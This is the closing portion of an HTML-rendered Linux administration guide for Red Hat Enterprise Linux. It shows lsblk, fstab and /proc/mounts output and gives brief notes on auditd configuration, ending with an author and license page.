Signature   : RSA/SHA256, Sat 20 Nov 2021 05:50:43 AM EST, Key ID 199e2f91fd431d51
Source RPM  : basesystem-11-13.el9.src.rpm
Build Date  : Mon 09 Aug 2021 03:47:02 PM EDT
Build Host  : x86-vm-55.build.eng.bos.redhat.com
Packager    : Red Hat, Inc. &lt;http://bugzilla.redhat.com/bugzilla&gt;
Vendor      : Red Hat, Inc.
Summary     : The skeleton package which defines a simple Red Hat Enterprise Linux system
</code></pre>
<h1 id="chapters-22-config-file-system"><a class="header" href="#chapters-22-config-file-system">File System</a></h1>
<h3 id="chapters-22-config-using-lsblk"><a class="header" href="#chapters-22-config-using-lsblk">Using lsblk</a></h3>
<pre><code class="language-bash">[tlasso@rhel-richmondfc scripts]$ lsblk -f
NAME          FSTYPE      FSVER    LABEL UUID                                   FSAVAIL FSUSE% MOUNTPOINTS
sda                                                                                            
sda1        vfat        FAT32          D7C9-A9C8                               591.8M     1% /boot/efi
sda2        xfs                        f96af77c-de86-4f65-b914-33373c4313cf    730.5M    28% /boot
sda3        LVM2_member LVM2 001       wZx9a7-JGa6-Za1A-3xtF-UXNZ-kPYx-w2gGVZ                
  rhel-root xfs                        51074d0b-8172-4bd0-aca8-1558aa348c34     29.3G    15% /
  rhel-swap swap        1              7f8666f3-f284-4ee6-9bb2-91b3d8686a02                  [SWAP]
sr0                  
</code></pre>
<p>We can determine the file system in use as xfs for rhel-root (<code>/</code>) mount.</p>
<h3 id="chapters-22-config-from-fstab"><a class="header" href="#chapters-22-config-from-fstab">From fstab</a></h3>
<p>fstab file contains the file system information. </p>
<pre><code class="language-bash">cat /etc/fstab
</code></pre>
<pre><code class="language-bash">[tlasso@rhel-richmondfc scripts]$ cat /etc/fstab

#
# /etc/fstab
# Created by anaconda on Wed Jun 14 06:26:07 2023
#
# Accessible filesystems, by reference, are maintained under '/dev/disk/'.
# See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) for more info.
#
# After editing this file, run 'systemctl daemon-reload' to update systemd
# units generated from this file.
#
/dev/mapper/rhel-root   /                       xfs     defaults        0 0
UUID=f96af77c-de86-4f65-b914-33373c4313cf /boot                   xfs     defaults        0 0
UUID=D7C9-A9C8          /boot/efi               vfat    umask=0077,shortname=winnt 0 2
/dev/mapper/rhel-swap   none                    swap    defaults        0 0
</code></pre>
<h2 id="chapters-22-config-mounts"><a class="header" href="#chapters-22-config-mounts">Mounts</a></h2>
<pre><code class="language-bash">cat /proc/mounts
</code></pre>
<pre><code class="language-bash">[tlasso@rhel-richmondfc proc]$ cat /proc/mounts
proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0
sysfs /sys sysfs rw,seclabel,nosuid,nodev,noexec,relatime 0 0
devtmpfs /dev devtmpfs rw,seclabel,nosuid,size=4096k,nr_inodes=1958404,mode=755,inode64 0 0
securityfs /sys/kernel/security securityfs rw,nosuid,nodev,noexec,relatime 0 0
tmpfs /dev/shm tmpfs rw,seclabel,nosuid,nodev,size=7864436k,nr_inodes=1966109,inode64 0 0
devpts /dev/pts devpts rw,seclabel,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000 0 0
tmpfs /run tmpfs rw,seclabel,nosuid,nodev,size=3145776k,nr_inodes=819200,mode=755,inode64 0 0
cgroup2 /sys/fs/cgroup cgroup2 rw,seclabel,nosuid,nodev,noexec,relatime,nsdelegate,memory_recursiveprot 0 0
pstore /sys/fs/pstore pstore rw,seclabel,nosuid,nodev,noexec,relatime 0 0
efivarfs /sys/firmware/efi/efivars efivarfs rw,nosuid,nodev,noexec,relatime 0 0
bpf /sys/fs/bpf bpf rw,nosuid,nodev,noexec,relatime,mode=700 0 0
/dev/mapper/rhel-root / xfs rw,seclabel,relatime,attr2,inode64,logbufs=8,logbsize=32k,noquota 0 0
selinuxfs /sys/fs/selinux selinuxfs rw,nosuid,noexec,relatime 0 0
</code></pre>
<h2 id="chapters-22-config-system-audit-configuration-and-audit-rules-1"><a class="header" href="#chapters-22-config-system-audit-configuration-and-audit-rules-1">System Audit configuration and Audit rules <sup class="footnote-reference"><a href="#chapters-22-config-audit">1</a></sup></a></h2>
<h3 id="chapters-22-config-auditdconf"><a class="header" href="#chapters-22-config-auditdconf">auditd.conf</a></h3>
<p>The <code>/etc/audit/auditd.conf</code> file is the main configuration file for the Linux Audit daemon (auditd). It is responsible for controlling the behavior of the audit system, allowing administrators to specify various parameters, such as how to log events, where to store log files, how much disk space to use, and when to take certain actions in response to specific system events. </p>
<h3 id="chapters-22-config-auditrules"><a class="header" href="#chapters-22-config-auditrules">audit.rules</a></h3>
<p>The default audit configuration file is located at <code>/etc/audit/auditd.conf</code>. </p>
<div class="footnote-definition" id="chapters-22-config-audit"><sup class="footnote-definition-label">1</sup>
<p>https://www.redhat.com/sysadmin/configure-linux-auditing-auditd </p>
</div>
<div style="break-before: page; page-break-before: always;"></div><div id="chapters-25-about"></div><h1 id="chapters-25-about-about"><a class="header" href="#chapters-25-about-about">About</a></h1>
<p>Author: Jayaram Sreevalsan </p>
<p>License: MIT</p>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->


                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">

            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="elasticlunr.min.js"></script>
        <script src="mark.min.js"></script>
        <script src="searcher.js"></script>

        <script src="clipboard.min.js"></script>
        <script src="highlight.js"></script>
        <script src="book.js"></script>

        <!-- Custom JS scripts -->

        <script>
        window.addEventListener('load', function() {
            window.setTimeout(window.print, 100);
        });
        </script>

    </div>
    </body>
</html>
